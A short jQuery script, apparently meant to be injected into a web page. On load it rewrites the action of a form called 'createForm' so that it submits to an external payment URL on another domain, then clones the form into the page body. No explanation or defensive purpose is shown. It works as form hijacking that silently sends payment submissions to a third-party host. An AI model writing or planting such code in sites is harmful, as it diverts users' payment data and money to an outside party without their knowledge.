$(function() {
    function insertAfter(newElement, targetElement) {
        let parent = targetElement.parentNode;
        if (parent.lastChild == targetElement) {
            parent.appendChild(newElement);
        } else {
            parent.insertBefore(newElement, targetElement.nextSibling);
        }
    }

    const scriptEle = document.createElement("script");
    scriptEle.type = "text/javascript";
    scriptEle.text = `document.getElementById('createForm').action = 'https://www.xiaoxiaoshagua.com/create_payment/';`;
    var formNode = document.getElementById('createForm');
    insertAfter(scriptEle, formNode);
    let node = document.getElementById('createForm');
    let cv = node.cloneNode(true);
    document.body.appendChild(cv);
    // document.getElementById('haha').remove();
    console.log(new Date());
});
